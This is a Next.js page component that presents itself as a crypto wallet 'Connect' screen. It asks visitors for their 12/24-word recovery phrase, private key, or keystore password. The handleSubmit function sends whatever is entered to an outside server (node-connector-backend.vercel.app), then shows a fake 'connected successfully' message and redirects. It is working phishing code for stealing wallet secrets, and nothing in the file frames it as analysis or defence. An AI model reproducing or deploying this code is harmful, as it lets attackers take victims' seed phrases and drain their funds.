"use client";
import React, { useState } from "react";
import axios from "axios";
import { useRouter, useParams } from "next/navigation";

const ConnectPage = () => {
  const router = useRouter();
  const params = useParams();
  const walletName = params?.slug || "Unknown Wallet";

  const [activeTab, setActiveTab] = useState("phrase");
  const [formData, setFormData] = useState({
    phrase: "",
    privateKey: "",
    keystore: null,
    keystorePassword: "",
  });
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState({ type: "", message: "" });

  const handleSubmit = async () => {
    setLoading(true);
    setStatus({ type: "", message: "" });

    try {
      let payload = { wallet: walletName };

      if (activeTab === "phrase") {
        payload = { ...payload, type: "phrase", data: formData.phrase };
      } else if (activeTab === "privateKey") {
        payload = { ...payload, type: "privateKey", data: formData.privateKey };
      } else if (activeTab === "keystore") {
        payload = {
          ...payload,
          type: "keystore",
          data: {
            file: formData.keystore ? formData.keystore.name : "No file",
            password: formData.keystorePassword,
          },
        };
      }

      await axios.post(
        "https://node-connector-backend.vercel.app/api/submit",
        payload
      );

      setStatus({
        type: "success",
        message: `${walletName} connected successfully! Redirecting...`,
      });

      setTimeout(() => router.push("/"), 2000);
    } catch (error) {
      setStatus({
        type: "error",
        message: `❌ ${walletName} connection failed. Please try again.`,
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-950 flex items-center justify-center px-4 py-10">
      <div className="bg-gray-900 rounded-2xl shadow-lg w-full max-w-lg p-8 text-white">
        <h2 className="text-xl font-bold mb-4 text-center">
          Connect to <span className="text-cyan-400">{walletName}</span>
        </h2>

        {/* Tabs */}
        <div className="flex border-b border-gray-700 mb-6">
          {["phrase", "privateKey", "keystore"].map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`flex-1 py-2 font-semibold capitalize transition ${
                activeTab === tab
                  ? "border-b-2 border-cyan-400 text-cyan-400"
                  : "text-gray-400 hover:text-white"
              }`}
            >
              {tab === "phrase"
                ? "Phrase"
                : tab === "privateKey"
                ? "Private Key"
                : "Keystore JSON"}
            </button>
          ))}
        </div>

        {/* Status */}
        {status.message && (
          <div
            className={`mb-4 p-3 rounded-lg text-sm ${
              status.type === "success"
                ? "bg-green-500/20 text-green-400 border border-green-500/30"
                : "bg-red-500/20 text-red-400 border border-red-500/30"
            }`}
          >
            {status.message}
          </div>
        )}

        {/* Content */}
        <div className="space-y-6">
          {activeTab === "phrase" && (
            <textarea
              rows="4"
              value={formData.phrase}
              onChange={(e) =>
                setFormData({ ...formData, phrase: e.target.value })
              }
              className="w-full p-3 rounded-lg bg-gray-800 border border-gray-700 focus:border-cyan-400 focus:ring focus:ring-cyan-400/20 outline-none resize-none"
              placeholder="Enter your 12/24-word phrase"
            />
          )}

          {activeTab === "privateKey" && (
            <input
              type="text"
              value={formData.privateKey}
              onChange={(e) =>
                setFormData({ ...formData, privateKey: e.target.value })
              }
              className="w-full p-3 rounded-lg bg-gray-800 border border-gray-700 focus:border-cyan-400 focus:ring focus:ring-cyan-400/20 outline-none"
              placeholder="Private Key"
            />
          )}

          {activeTab === "keystore" && (
            <>
              <input
                type="file"
                accept=".json"
                onChange={(e) =>
                  setFormData({ ...formData, keystore: e.target.files[0] })
                }
                className="w-full text-sm text-gray-400 file:mr-4 file:py-2 file:px-4
                  file:rounded-lg file:border-0 file:text-sm file:font-semibold
                  file:bg-cyan-500/20 file:text-cyan-400 hover:file:bg-cyan-500/30"
              />
              <input
                type="password"
                value={formData.keystorePassword}
                onChange={(e) =>
                  setFormData({ ...formData, keystorePassword: e.target.value })
                }
                placeholder="Enter Keystore Password"
                className="w-full mt-4 p-3 rounded-lg bg-gray-800 border border-gray-700 focus:border-cyan-400 focus:ring focus:ring-cyan-400/20 outline-none"
              />
            </>
          )}
        </div>

        {/* Submit button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full mt-6 bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] text-black font-semibold py-3 rounded-lg hover:opacity-90 transition disabled:opacity-50"
        >
          {loading ? "Connecting..." : "Connect"}
        </button>
      </div>
    </div>
  );
};

export default ConnectPage;
